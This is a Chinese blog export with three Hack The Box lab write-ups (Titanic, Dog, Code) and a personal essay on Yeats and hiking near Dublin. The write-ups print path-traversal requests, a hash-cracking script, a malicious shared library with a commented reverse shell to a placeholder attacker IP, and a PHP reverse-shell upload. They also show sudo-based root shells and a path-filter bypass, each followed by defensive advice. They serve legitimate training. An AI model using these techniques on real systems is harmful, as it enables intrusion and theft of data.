[{"title":"Hackthebox 赛季靶场 Titanic Writeup","path":"/2025/04/05/Titanic/","content":"靶机信息: IP 地址: 10.10.11.55 目标: 获取 user.txt 和 root.txt 一、 信息收集与初始探测 1. 端口扫描 (Nmap) 首先使用 Nmap 对目标进行端口扫描，了解开放的服务： 扫描结果显示开放了 22 (SSH) 和 80 (HTTP) 端口。HTTP 服务返回 302 重定向，指向域名 http://titanic.htb/。 2. 配置 Hosts 文件 为了正常访问 Web 服务，我们需要将域名和 IP 地址添加到本地 hosts 文件。 110.10.11.55 titanic.htb 3. 访问 Web 服务 配置好 hosts 文件后，在浏览器中访问 http://titanic.htb/。看到了一个关于泰坦尼克号邮轮预订的网站。 网站底部有一个预订信息的提交表单： 二、 Web 应用枚举与漏洞发现 1. 技术栈识别 (WhatWeb) 使用 whatweb 识别网站使用的技术： 1whatweb http://titanic.htb/ 关键信息： 后端：Werkzeug/3.0.3 (Python Web 框架) Python 版本：3.10.12 前端：Bootstrap, JQuery 2. 目录与子域名扫描 使用 dirsearch 扫描目录，但未发现有价值的信息（大多是 40x 错误）。 接着，使用 gobuster 结合子域名字典进行子域名爆破： 扫描发现了一个子域名 dev.titanic.htb。将其添加到 hosts 文件： 110.10.11.55 titanic.htb dev.titanic.htb 3. 表单提交与路径遍历漏洞 回到主站 http://titanic.htb/，尝试提交预订表单，并使用 Burp Suite 拦截请求和响应。 提交表单后，服务器返回一个 302 重定向，指向一个下载链接，格式为 /download?ticket=UUID.json。 这个 ticket 参数看起来很可疑。尝试利用它进行路径遍历，读取服务器上的敏感文件。我们尝试读取 /etc/passwd： 修改 Burp Repeater 中的请求，将 /download?ticket=UUID.json 改为 /download?ticket=../../../../../../etc/passwd。 成功读取！这确认了路径遍历漏洞的存在。在 /etc/passwd 中，我们注意到了 developer 用户。 三、 利用路径遍历深入挖掘 1. 探索开发环境 (dev.titanic.htb) 访问之前发现的子域名 http://dev.titanic.htb/。 页面显示这是一个 Gitea 服务（一个自托管的 Git 服务），然后转向左上角探索，可以看到代码仓库。 查看到 docker-compose.yml 的配置片段。 12volumes: - /home/developer/gitea/data:/data # Replace with your path 这表明 Gitea 容器的 /data 目录映射到了宿主机的 /home/developer/gitea/data 目录。 2. 读取 Gitea 配置文件 Gitea 的默认配置文件通常位于 /etc/gitea/conf/app.ini 或其数据目录下的 gitea/conf/app.ini。结合上面发现的 Volume 映射，我们可以推断出宿主机上配置文件的实际路径可能是 /home/developer/gitea/data/gitea/conf/app.ini。 3. 分析配置文件，定位数据库 利用之前发现的路径遍历漏洞，尝试读取这个文件： 在 app.ini 文件中，我们找到了数据库的配置信息： 1234567[database]DB_TYPE = sqlite3HOST = 127.0.0.1:3306NAME = giteaUSER = rootPASSWD =PATH = /data/gitea/gitea.db ; Path to the database file for sqlite3 关键信息： 数据库类型：SQLite3 数据库文件路径 (容器内): /data/gitea/gitea.db 结合之前的 Volume 映射 (/home/developer/gitea/data:/data)，我们可以确定数据库文件在宿主机上的绝对路径为：/home/developer/gitea/data/gitea/gitea.db。 四、 获取用户权限 (User Flag) 1. 下载 Gitea 数据库 既然知道了数据库文件的绝对路径，我们可以再次利用路径遍历漏洞将其下载到本地进行分析： 2. 分析数据库，提取密码哈希 使用 SQLite 客户端打开下载的 gitea.db 文件，查找用户表（通常是 user 表）。 找到了 developer 用户的密码哈希和对应的盐值 (Salt)： 用户: developer 哈希 (passwd): e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 盐 (salt): 8bf3e3452b78544f8bee9400d6936d34 (需要注意，数据库中存储的是 Hex 编码的字符串，使用时需要解码为 bytes) Gitea 通常使用 PBKDF2-HMAC-SHA256 算法来存储密码哈希。需要破解这个哈希来获取 developer 用户的明文密码。 3. 破解密码哈希 可以使用 Hashcat 或者编写一个简单的 Python 脚本来尝试破解。使用 hashlib.pbkdf2_hmac 结合字典进行爆破。Gitea 的默认迭代次数通常较高（如 50000），需要在破解时指定正确的参数。 准备字典: 将使用常见的 rockyou.txt 字典。 Python 破解脚本 (crack_gitea.py): 12345678910111213141516171819202122232425262728293031323334import hashlibimport binascii def pbkdf2_hash(password, salt, iterations=50000, dklen=50): hash_value = hashlib.pbkdf2_hmac( &#x27;sha256&#x27;, password.encode(&#x27;utf-8&#x27;), salt, iterations, dklen ) return hash_value def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50): target_hash_bytes = binascii.unhexlify(target_hash) with open(dictionary_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: count = 0 for line in file: password = line.strip() hash_value = pbkdf2_hash(password, salt, iterations, dklen) count += 1 print(f&quot;正在检查密码 &#123;count&#125;: &#123;password&#125;&quot;) if hash_value == target_hash_bytes: print(f&quot; Found password: &#123;password&#125;&quot;) return password print(&quot;Password not found.&quot;) return None salt = binascii.unhexlify(&#x27;8bf3e3452b78544f8bee9400d6936d34&#x27;)target_hash = &#x27;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&#x27;# 字典的路径dictionary_file = &#x27;/home/admin/tool/rockyou.txt&#x27;find_matching_password(dictionary_file, target_hash, salt) 运行脚本进行破解: 1python crack_gitea.py 脚本成功找到了密码！ 用户名: developer 密码: 25282528 4. SSH 登录并获取 User Flag 现在我们拥有了 developer 用户的凭据，可以通过 SSH 登录目标机器： 12ssh developer@titanic.htb# 输入密码: 25282528 登录成功后，查找并读取 user.txt 文件： 成功获取 User Flag！ 五、 权限提升 (Root Flag) 获取了普通用户权限后，下一步是寻找提权到 root 的方法。 1. 本地枚举 在 developer 用户下进行枚举，寻找潜在的提权向量。检查 sudo -l、SUID 文件、计划任务 (cron jobs)、系统服务配置、可写目录和可执行脚本等。 sudo -l: developer 用户无法免密执行任何 sudo 命令。 查找可执行脚本和可写目录： 123456789# 查找 /opt 目录下用户可执行的文件developer@titanic:~$ find /opt -type f -perm -u=x 2&gt;/dev/null/opt/scripts/identify_images.sh/opt/app/app.py# 查找 /opt 目录下用户可写的目录developer@titanic:~$ find /opt -writable -type d 2&gt;/dev/null/opt/app/static/assets/images/opt/app/tickets 我们发现了一个可执行脚本 /opt/scripts/identify_images.sh 和一个用户可写的目录 /opt/app/static/assets/images。这值得深入研究。 2. 分析可疑脚本 查看 /opt/scripts/identify_images.sh 的内容： 脚本的关键行为： cd /opt/app/static/assets/images: 切换工作目录到我们可写的目录！ 执行 /usr/bin/magick identify 命令处理该目录下的 .jpg 文件。 如果这个脚本是由 root 用户定期运行（例如通过 cron），并且 magick 命令存在某种漏洞，我们就有机会利用可写目录来执行代码。 3. 检查 ImageMagick 版本并查找漏洞 查看 /usr/bin/magick 的版本： 版本为 ImageMagick 7.1.1-35。搜索该版本的漏洞，发现一个相关的 CVE 或安全公告：GHSA-8rxc-922v-phg8。 这个漏洞与 ImageMagick 的 AppImage 打包有关。其 AppRun 启动脚本在设置某些环境变量（如 LD_PRELOAD, LD_LIBRARY_PATH 或 MAGICK_CONFIGURE_PATH）时，会查找并加载当前工作目录下的某些配置文件或库文件。 漏洞利用思路: /opt/scripts/identify_images.sh 脚本首先 cd 进入了我们可写的目录 /opt/app/static/assets/images。 然后，脚本以其执行者（推测是 root）的权限执行 /usr/bin/magick identify。 由于 magick 是一个 AppImage 打包的程序 (或其启动脚本存在类似行为)，它在启动时会检查当前工作目录（也就是我们可写的 /opt/app/static/assets/images）是否存在特定的库文件。 如果我们在这个可写目录下放置一个精心构造的、与 ImageMagick 期望加载的库同名的恶意共享库（.so 文件），那么 magick 命令在执行时就会加载并执行我们库中的代码。 利用 C 语言的 __attribute__((constructor)) 特性，可以在共享库被加载时自动执行我们定义的函数（Payload）。 4. 制作并部署恶意共享库 a. 编写恶意 C 代码 (exploit.c): 创建一个 C 文件，包含我们的 payload。Payload 的目标是将 /root/root.txt 文件复制到我们可访问的目录 /opt/app/static/assets/images/ 并修改其权限，以便我们能读取它。 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// 这个函数会在库被加载时自动运行__attribute__((constructor)) void run_payload()&#123; // 以 root 权限执行复制和修改权限操作 system(&quot;cp /root/root.txt /opt/app/static/assets/images/root.txt&quot;); system(&quot;chmod 777 /opt/app/static/assets/images/root.txt&quot;); // 可以选择性地添加其他命令，例如反弹 shell // system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/YOUR_ATTACKER_IP/PORT 0&gt;&amp;1&#x27;&quot;); // exit(0); // 执行完后可以退出，避免 ImageMagick 报错&#125; b. 编译共享库: 在你的攻击机或目标机器上（如果目标机器上有 gcc），使用 gcc 将 C 代码编译成共享库。根据漏洞 PoC 或常见实践，我们可以尝试使用 ImageMagick 可能加载的库名，例如 libxcb.so.1。 将编译好的 libxcb.so.1 文件放置到目标脚本的工作目录，也就是我们可写的 /opt/app/static/assets/images/ 目录下。 1gcc -shared -fPIC -o ./libxcb.so.1 exploit.c 5. 等待触发与获取 Root Flag 现在，我们只需要等待 /opt/scripts/identify_images.sh 脚本被执行。这个脚本很可能是通过 root 用户的 Cron 任务定时运行的（例如，每隔几分钟）。 当脚本运行时： 它会 cd 到 /opt/app/static/assets/images/。 它会以 root 权限执行 /usr/bin/magick identify。 magick 进程启动时，会查找并加载当前目录下的 libxcb.so.1。 我们恶意库中的 run_payload 函数被执行。 /root/root.txt 文件被复制到 /opt/app/static/assets/images/root.txt，并且权限被设置为 777。 等待一小段时间（可能需要几分钟），然后检查 /opt/app/static/assets/images/ 目录： 123developer@titanic:/opt/app/static/assets/images$ ls -ltotal 1.3M-rwxrwxrwx 1 root root 33 Apr 5 07:05 root.txt # &lt;-- 文件出现了！权限是 777 成功获取 Root Flag！ 六、 总结 Titanic 靶机是一次有趣且涵盖多种技术的渗透测试体验： 初始 foothold: 通过 Nmap 发现重定向，配置 hosts 文件访问 Web 服务。 Web 漏洞: 利用预订表单后的 /download 功能存在的路径遍历漏洞，读取了敏感文件。 信息泄露: 通过路径遍历读取了 dev 子域 Gitea 服务的配置文件 (app.ini) 和 SQLite 数据库 (gitea.db)。 密码破解: 从数据库中提取了 developer 用户的 PBKDF2 哈希和盐值，并使用字典爆破得到明文密码。 获取用户权限: 使用破解的凭据 SSH 登录 developer 用户，获得 user flag。 权限提升: 分析发现一个由 root 运行的脚本 (identify_images.sh) 会在用户可写目录下执行 ImageMagick (magick)。利用 ImageMagick AppImage 的库加载漏洞 (GHSA-8rxc-922v-phg8)，通过放置恶意共享库 (.so 文件) 在脚本的工作目录，实现了代码执行，最终获取了 root flag。 七、 防护与缓解措施 修复路径遍历漏洞 (/download): 对用户输入进行严格过滤，禁止路径遍历字符 (../)。 在访问文件前，确保请求的路径位于授权的目录下。 保护敏感文件: 修复导致文件泄露的根源漏洞（如路径遍历）。 遵循最小权限原则，确保 Web 应用进程无权访问 Gitea 等其他服务的配置文件和数据。 强化身份验证: 强制使用强密码策略，增加密码破解难度。 考虑为 Gitea 等关键服务启用双因素认证 (2FA)。 安全配置计划任务与脚本: 避免让以高权限运行的脚本（如 Cron 任务）在用户可写的目录下执行外部命令。 如果必须在特定目录执行，确保所调用的程序（如 ImageMagick）已更新至最新版本，并已修复已知的库加载或命令注入漏洞。 定期审计系统上的 SUID/SGID 文件、计划任务和不安全的服务配置。","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Hackthebox 赛季靶场 Dog Writeup","path":"/2025/04/02/Dog — Hack The Box/","content":"靶机链接: https://app.hackthebox.com/machines/Dog 靶机 IP: 10.10.11.58 本次渗透测试的目标是获取 Hack The Box 上的 “Dog” 靶机的 user 和 root 权限。我们将从信息收集开始，逐步深入，最终获得最高权限。 一、信息收集 1. Nmap 端口扫描 先通过 PING 连接性测试之后，首先，照旧 Nmap 对目标 IP 10.10.11.58 进行端口扫描，以了解开放的服务。 图 1: Nmap 扫描显示开放了 22 (SSH - OpenSSH 8.2p1) 和 80 (HTTP - Apache 2.4.41) 端口，Web 服务器运行着 Backdrop CMS 1.x。 分析: 目标 IP: 10.10.11.58 操作系统: Ubuntu Linux 开放端口: 22 (SSH), 80 (HTTP) Web 应用: Backdrop CMS 1.x 关键信息点: Web 服务 (端口 80) 是主要入口。 Backdrop CMS 1.x 可能存在已知漏洞。 Nmap 脚本扫描还提示了 /.git/ 目录的存在，这是一个重要的潜在信息泄露点。 2. Web 服务 访问 http://10.10.11.58/，可以看到一个关于狗狗护理和健康的网站。 图 2: Dog 靶机 Web 服务首页。 查看 robots.txt 文件 (http://10.10.11.58/robots.txt)，发现其中列出了许多不允许爬虫访问的路径，这有助于我们了解网站结构。 图 3: Nmap 探测到的 robots.txt 路径。 图 4: robots.txt 文件内容，包含 /core, /admin, /modules 等路径。 3. 目录扫描与 .git 发现 使用 dirsearch 等工具进行目录扫描，确认了 .git 目录的存在。 1dirsearch -u http://10.10.11.58 图 5: Dirsearch 确认了 http://10.10.11.58/.git/ 目录的存在。 公开的 .git 目录意味着网站的源代码和版本历史可能被泄露，这是获取敏感信息（如配置文件、凭据）的关键突破口。 二、初步立足 (Initial Foothold) 1. 利用 .git 泄露获取源码 使用 git-dumper (或类似工具如 GitHack) 来下载 .git 仓库的内容。 1git-dumper.py http://10.10.11.58/.git/ .dog_repo 图 6: 使用 git-dumper 下载 .git 仓库。 图 7: git-dumper 成功下载并提示检出文件。 2. 分析源码，发现凭据 在下载的源码中搜索敏感信息。settings.php 通常是 CMS 的核心配置文件。 图 8: 在下载的源码中发现 settings.php 文件。 查看 settings.php 内容： 1cat settings.php 图 9: 在 settings.php 中找到 MySQL 数据库的密码 BackDropJ2024DS2024。 3. 登录 Backdrop CMS 后台 尝试使用找到的凭据 tiffany:BackDropJ2024DS2024 登录 Backdrop CMS 的后台 图 10: 确认用户名 tiffany。 图 11: 使用凭据成功登录 Backdrop CMS 后台。 4. 确定 CMS 版本并寻找漏洞 在下载的源码中搜索版本信息，确定 Backdrop CMS 的具体版本。 1grep -rin &quot;version&quot; . | grep &quot;&#x27;1.&quot; 图 12: 通过搜索源码中的 ‘version’ 关键字，确定版本为 1.27.1。 搜索 “Backdrop 1.27.1 exploit”，找到了 Exploit-DB 上的一个已认证远程命令执行 (RCE) 漏洞：https://www.exploit-db.com/exploits/52021。 该漏洞利用管理员权限，通过上传包含恶意 PHP 代码的模块来实现 RCE。 5. 准备并上传恶意模块 (反弹 Shell) 生成基础模块结构: 运行 Exploit-DB 提供的 Python 脚本 (52021.py) 来生成一个基础的模块压缩包和目录结构。 图 13: 生成 shell 目录和 shell.zip。 替换为反弹 Shell: 将 shell/shell.php 的内容替换为 PHP 反弹 Shell 代码 (例如来自 pentestmonkey 的脚本，php-reverse-shell.php)。修改脚本中的 $ip 为你的攻击机 IP，$port 为你打算监听的端口 (例如 1234)。 打包为 .tar.gz: 查看后台模块上传页面 (/?q=admin/installer/manual)，发现它只接受 .tar, .tgz, .gz, .bz2 格式。因此，需要将修改后的 shell 目录打包成 .tar.gz 格式。 图 14: 手动安装模块的界面。 图 15: 上传界面提示支持的压缩格式。 12# 将修改好的 shell.php 放入 shell 目录tar czvf shell.tar.gz shell/ 图 16: 使用 tar 命令创建 shell.tar.gz。 设置监听: 在攻击机上使用 nc 监听指定端口。 1nc -nlvp 1234 (注意：确保你的防火墙允许该端口的入站连接。) 上传并触发: 在 Backdrop CMS 后台上传 shell.tar.gz 文件。 图 17: 在后台上传准备好的恶意模块压缩包。 上传成功后，访问模块中的 PHP 文件以触发反弹 Shell： 1curl http://10.10.11.58/modules/shell/shell.php (如果直接访问无反应，可能是因为 PHP 脚本尝试后台运行，或者防火墙阻止了出站连接。使用 curl 或浏览器访问通常能成功触发。) 6. 获取反弹 Shell 成功触发后，nc 监听器应收到来自目标服务器的连接，获得一个 www-data 用户的 Shell。 图 18: nc 监听器成功接收到来自靶机的反弹 Shell，用户为 www-data。 为了更好的交互体验，可以使用 Python 升级 Shell： 12which python3python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 三、用户权限提升 (User Privilege Escalation) 在 www-data Shell 中，查看 /home 目录，发现存在用户 johncusack。 尝试读取 /home/johncusack/user.txt，发现权限不足。 回忆之前在 settings.php 中找到的数据库密码 BackDropJ2024DS2024，尝试用它切换到 johncusack 用户。 12su johncusack# 输入密码: BackDropJ2024DS2024 图 19: 成功使用之前找到的密码切换到 johncusack 用户。 切换成功后，即可读取 user.txt 文件。 1cat /home/johncusack/user.txt 四、Root 权限提升 (Root Privilege Escalation) 1. Sudo 权限检查 在 johncusack 用户下，检查其 sudo 权限。 12sudo -l# 再次输入密码: BackDropJ2024DS2024 图 20: sudo -l 显示 johncusack 可以以任意用户 (ALL:ALL) 身份，无需密码执行 /usr/local/bin/bee 命令。 结果显示 johncusack 用户可以无需密码以 root 权限执行 /usr/local/bin/bee 命令。 2. 分析 bee 命令 bee 是 Backdrop CMS 的命令行工具。查看其帮助信息或相关文档，寻找可利用的功能。 1/usr/local/bin/bee --help 图 21: bee 命令帮助信息显示存在 eval (ev) 子命令，可以执行任意 PHP 代码。 关键在于 eval (或 ev) 子命令，它允许执行任意 PHP 代码。 3. 利用 bee eval 获取 Root Shell 由于我们可以通过 sudo 以 root 权限运行 bee，并且 bee 可以执行 PHP 代码，我们可以结合这两点来获取 root Shell。 首先，bee 命令通常需要在 Backdrop CMS 的网站根目录下执行才能正常工作。 12cd /var/www/htmlsudo /usr/local/bin/bee ev &#x27;system(&quot;/bin/bash&quot;);&#x27; 这个命令做了以下事情： sudo /usr/local/bin/bee: 以 root 权限启动 bee 工具。 ev: 使用 bee 的 eval 功能。 'system(&quot;/bin/bash&quot;);': 要执行的 PHP 代码。system() 函数用于执行系统命令，这里我们让它启动一个 Bash Shell。 图 22: 执行 sudo bee ev ‘system(“/bin/bash”);’ 后，成功获得 root 权限的 Shell。 4. 读取 Root Flag 现在可以读取位于 /root 目录下的 root.txt 文件。 五、总结 本次 Dog 靶机的渗透测试过程关键点如下： 信息收集: 通过 Nmap 扫描发现 Web 服务 (Backdrop CMS) 和 .git 目录暴露。 初步立足: 利用 git-dumper 下载 .git 仓库源码，在 settings.php 中找到数据库凭据 (tiffany:BackDropJ2024DS2024)。使用该凭据登录 Backdrop CMS 后台。 漏洞利用: 确定 CMS 版本为 1.27.1，找到对应的已认证 RCE 漏洞 (Exploit-DB 52021)。制作包含反弹 Shell 的恶意模块 (.tar.gz 格式)，通过后台上传并触发，获得 www-data Shell。 用户提权: 使用之前获取的密码 BackDropJ2024DS2024 通过 su 命令切换到 johncusack 用户，获得 user flag。 Root 提权: 检查 sudo -l 发现 johncusack 可以免密以 root 权限运行 bee 命令。利用 bee 的 eval 功能执行 PHP system('/bin/bash')，最终获得 root Shell 并读取 root flag。 六、防御 定期审计与加固： 必须定期审计 Web 服务器配置，确保禁止目录列表，并严格限制对敏感目录（如 .git, .svn 等版本控制目录，以及配置文件目录）的访问。 严格审查 sudoers 配置，遵循最小权限原则，避免使用 ALL 和 NOPASSWD，精确授权必要的命令。 补丁与更新管理： 及时更新 CMS 核心、主题和插件至最新安全版本，是防御已知漏洞利用的基础。订阅相关的安全公告。 Secrets Management： 绝不将密码、API 密钥等敏感信息硬编码在代码或配置文件中，并提交到版本控制系统。应使用环境变量、安全的 Secrets Management 工具或安全的配置文件注入方式。 强制安全策略： 实施强密码策略，并禁止密码重用。考虑为关键系统（如 SSH、管理后台）启用多因素认证 (MFA)。","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权","path":"/2025/03/31/Code — Hack The Box/","content":"介绍 靶机链接: https://app.hackthebox.com/machines/Code 靶机 IP: 10.10.11.62 本次 Hackthebox 靶机 “Code” 的目标是利用一个运行在 5000 端口的 Python 代码编辑器，通过代码执行漏洞获取用户凭据，然后利用 backy.sh 备份脚本的漏洞进行提权，最终获取 root 权限。 思路： 信息收集：使用Nmap发现开放的5000端口运行Python代码执行服务 漏洞发现：利用SQLAlchemy ORM进行数据库查询获取用户凭据 获取立足点：使用破解的用户凭据进行SSH登录 权限提升：利用备份脚本backy.sh的路径解析漏洞访问受限目录 一、信息收集 首先使用 Nmap 进行端口扫描 Nmap 扫描结果： 发现开放的22(SSH)和5000(HTTP)端口。5000端口运行着&quot;Python Code Execution Page&quot;。 确定Web框架 尝试Django ORM语法：User.objects.all()（失败） 尝试SQLAlchemy语法：User.query.all()（成功） 确认目标使用SQLAlchemy作为ORM框架 12users = db.session.query(User).all()print([(u.id, u.username, u.password) for u in users]) 代码执行结果： 成功查询到用户 development 和 martin 的信息，包括用户名和密码哈希值 使用CrackStation在线破解获得明文密码 密码破解结果： 成功破解出两个用户的明文密码： 用户 ID 用户名 密码哈希 (Password Hash) 哈希类型 (Hash Type) 已破解密码 (Cracked Password) 1 development 759b74ce43947f5f4c91aeddc3e5bad3 md5 development 2 martin 3de6f30c4a09c27fc71932bfc68474be md5 nafeelswordsmaster 尝试使用破解的密码进行 SSH 登录。 12ssh development@10.10.11.62 # 失败ssh martin@10.10.11.62 # 成功（密码：nafeelswordsmaster） 二、userFlag 登录 martin 用户后，首先查看用户目录下的文件，发现 backups 目录。 进入 backups 目录，查看目录内容，没有发现 user.txt 文件。 输入 sudo -l 命令查看当前用户可以以 sudo 权限执行的命令。 发现 martin 用户可以使用 sudo 权限执行 /usr/bin/backy.sh 脚本，这可能是一个提权点。 查看 /usr/bin/backy.sh 脚本的内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950cat /usr/bin/backy.sh#!/bin/bashif [[ $# -ne 1 ]]; then /usr/bin/echo &quot;Usage: $0 &lt;task.json&gt;&quot; exit 1fijson_file=&quot;$1&quot;if [[ ! -f &quot;$json_file&quot; ]]; then /usr/bin/echo &quot;Error: File &#x27;$json_file&#x27; not found.&quot; exit 1fi# 定义了允许备份的路径前缀，只允许备份以 /var/ 或 /home/ 开头的目录allowed_paths=(&quot;/var/&quot; &quot;/home/&quot;)# 使用 jq 工具处理JSON文件，删除 directories_to_archive 数组中所有路径中的 ../ 序列# 这里在尝试防止目录遍历，但它只替换了确切的 ../ 字符串# gsub(&quot;\\\\.\\\\./&quot;; &quot;&quot;): 这是 gsub 函数，用于全局替换字符串。# &quot;\\\\.\\\\./&quot;: 要被替换的 正则表达式。 \\\\. 表示转义后的点号 (.)， \\. 表示字面意义的点号。 .. 就是字面意义的 &quot;..&quot;。 所以 # \\\\.\\\\./ 匹配的是字符串 ../。# &quot;&quot;: 替换成空字符串。updated_json=$(/usr/bin/jq &#x27;.directories_to_archive |= map(gsub(&quot;\\\\.\\\\./&quot;; &quot;&quot;))&#x27; &quot;$json_file&quot;)/usr/bin/echo &quot;$updated_json&quot; &gt; &quot;$json_file&quot;directories_to_archive=$(/usr/bin/echo &quot;$updated_json&quot; | /usr/bin/jq -r &#x27;.directories_to_archive[]&#x27;)is_allowed_path() &#123; local path=&quot;$1&quot; for allowed_path in &quot;$&#123;allowed_paths[@]&#125;&quot;; do if [[ &quot;$path&quot; == $allowed_path* ]]; then return 0 fi done return 1&#125;for dir in $directories_to_archive; do if ! is_allowed_path &quot;$dir&quot;; then /usr/bin/echo &quot;Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.&quot; exit 1 fidone/usr/bin/backy &quot;$json_file&quot;martin@code:~$ 分析 backy.sh 脚本，发现其主要功能如下： 参数检查: 必须传入 JSON 配置文件路径（例如 task.json）。 路径过滤: 使用 jq 移除 directories_to_archive 中的 ../，防止目录遍历攻击，可以使用 ....// 这样的序列，当 ../ 被移除后，会变成 ../ 路径限制: 只允许备份 /var/ 和 /home/ 开头的目录。 备份操作: 使用 tar 命令将指定目录打包备份到指定目标路径。 进入 backups 目录，查看已存在的 task.json 文件内容。 查看 task.json 文件内容: task.json 文件的内容配置了备份 /home/app-production/app 目录到 /home/martin/backups/ 目录。 尝试执行 sudo /usr/bin/backy.sh task.json 命令，测试备份脚本是否正常工作。 脚本成功执行，并在 /home/martin/backups/ 目录下生成了一个压缩包 code_home_app-production_app_xxxx_xxxx.tar.bz2。 解压该压缩包，验证备份内容。 解压备份文件： 解压后发现，备份脚本确实将 /home/app-production/app 目录下的所有内容都备份到了压缩包中。 这意味着我们可以通过修改 task.json 文件，让备份脚本备份其他目录，从而提取敏感信息。 修改 task.json 文件，将 directories_to_archive 修改为 &quot;/home/app-production/&quot;，目标是备份 /home/app-production/ 目录，以获取 userFlag。 修改后的 task.json 文件内容 (获取 userFlag): 再次执行 sudo /usr/bin/backy.sh task.json 命令。 执行 sudo /usr/bin/backy.sh task.json (获取 userFlag): 脚本成功执行，并在 /home/martin/backups/ 目录下生成了新的压缩包。 解压该压缩包，找到 user.txt 文件，即可获取 userFlag。 三、rootFlag 既然 userFlag 可以通过修改 task.json 文件获取，那么 rootFlag 也同理，我们可以尝试修改 task.json 文件来备份 root 目录。 尝试将 task.json 文件修改为备份 /root 目录。 由于 backy.sh 脚本会过滤掉 ../，为了绕过路径检查，我们使用路径 /home/....//root/。 这个路径在 Linux 文件系统中会被解析为 /root 目录。 12345678&#123; &quot;destination&quot;: &quot;/home/martin/backups/&quot;, &quot;multiprocessing&quot;: true, &quot;verbose_log&quot;: true, &quot;directories_to_archive&quot;: [ &quot;/home/....//root/&quot; ]&#125; 修改后的 task.json 文件内容，cat 进行查看发现 …/ 已经被过滤(获取 rootFlag): 可以看到，directories_to_archive 已经修改为 &quot;/home/../root/&quot;。 可以看到，backy.sh 脚本执行成功，并且 tar 命令开始打包 /home/../root/ 目录下的文件。从输出信息 Archiving: [/home/root] 和 tar: Removing leading '/home/../' 可以看出，backy.sh 和 tar 都正确地处理了这个路径，最终备份的目标是 /root 目录。 发现 root 目录！ 安全建议 代码编辑器安全: 避免对外暴露不必要的服务，例如代码编辑器。如果必须使用，请确保代码编辑器本身的安全，并进行严格的权限控制和输入验证，防止代码执行漏洞。 脚本安全: 对于具有高权限 (sudo) 的脚本，必须进行严格的安全审计，防止被恶意利用。 特别是要仔细检查脚本对用户输入 (例如配置文件) 的处理，防止路径遍历、命令注入等漏洞。 最小权限原则: 运行脚本和服务的用户，应遵循最小权限原则，避免赋予不必要的权限。 安全配置: 对于备份脚本，应仔细配置备份策略，例如限制备份目录范围，避免备份敏感数据。","tags":["Hack The Box"],"categories":["网络安全"]},{"title":"凯尔特的薄暮","path":"/2025/02/19/凯尔特的薄暮/","content":"幻想 如果不是我怜惜所有耽于幻想的孩子们，我会让他们争吵下去的，那么我现在就会有许多精彩的口角记录下来了。 书中的许多故事简短而富有童话般的色彩，仿佛让我回到了阅读安徒生童话的童年时光，读到中途，感觉稍显幼稚？想放弃但又坚持了下来。 我放弃的原因，一方面是随着年龄增长（次要原因），另一方面，也是更主要的原因，是生活和工作的操劳让我对事物的感受力逐渐消失。加之这次过年放假回家，我走在家乡的大道上，发现曾经熟悉的景象已面目全非。就像我家旁边那棵参天大槐树，记忆中它枝繁叶茂，每到秋天我都会去摘槐花，如今却已不见踪影。若非旧照片为证，我几乎要怀疑记忆中的景象是否真实存在过。还有每次晚上睡觉时，路灯透过窗户投射进屋内的光影，曾让那时的我看到千变万化的景象——有时是长发飘飘的女子，有时是流动的云彩。可如今再看，那些光影不过是再普通不过的光源罢了，不禁扼腕叹息。 虚妄 是相信大多虚妄之事和一点事实，还是纯粹为否认而否认所有的事实和想象。也许宁信其有不信其无是一种更明智的寻求真理的态度。 书中对自然的敬畏之情，这让我不禁想起上一本阅读的书籍——孔飞力的《叫魂》。江南水乡，妖术流言四起，人们因姓名、衣物乃至发辫的斩断而陷入无尽恐慌。这飘荡在水雾间的惊惧，竟与凯尔特农妇在壁炉余烬中窥视命运的身影奇妙地重叠，以及担心被仙人抓走的恐惧。何其相似的民间叙事！ 现在我们回看从前的事物，或许会觉得怎会如此愚昧、无知。但若脱离当时的时代背景，以今人的视角来看，我们又何尝没有自身的局限？探索真理，本就是摸着石头过河。 景色 我记得我们在那里站了几分钟，眺望着满是石头、荆棘和灌木的田野，突然我看到地平线上有一小团亮光，似乎在慢慢升向天空；然后有一两分钟，我们又看到其它一些微弱的光点，最后有一道明亮的火焰——犹如火炬一般——在河上快速地移动着。我们当时看着这一切，如梦如幻，似乎进入了一个不真实的世界。 不由得想起在都柏林徒步爬山时的情景，与Elon、Lydia、Catherine和来自台湾的朋友劉晉豪一起登顶的喜悦。与其说是登顶的成就感，倒不如说是途中所见的风景更令人难忘。通往山顶的路程始于一段陡坡，宽度堪比盘山公路，需要特别留意往来车辆，尤其是视觉盲区。还未到达山底，体力就已消耗不少。 抵达山底后开始真正的攀登，来到一处铺满鹅暖石的地方，还有青玉石般的台阶。瞬间觉得没白来。从下往上望去，台阶仿佛直通天际。沿途遇见三三两两的本地徒步者和情侣，中途还看到了印度人。印度人总是成群结队，这是我的印象，而白人更多是两三结群，或者独自行动。 随着海拔升高，气温渐低，天公作美地下起了雨，更添几分意趣。湿润的空气中，仿佛穿越回原始丛林，城市的喧嚣早已远去，内心告诉我这才是我向往的地方。想起杭州那个电梯爬山景区，虽然在无障碍设施方面做得很好，方便了老人和残疾人，但少了几分登山的乐趣。中国人太多，每次去逛些什么地方，像是西湖去了第一次，就不想再去第二次。不过偶尔晚上去西湖的时候，人不算多，见到波光粼粼的湖水，瞬间仿若仙境，更能嗅到泥土的芬芳。 回想起在飞机上俯瞰都柏林时，大片不规则的绿色山丘，让我想起小学时看过的纪录片，从生命诞生之初，到人类文明的蓬勃发展。 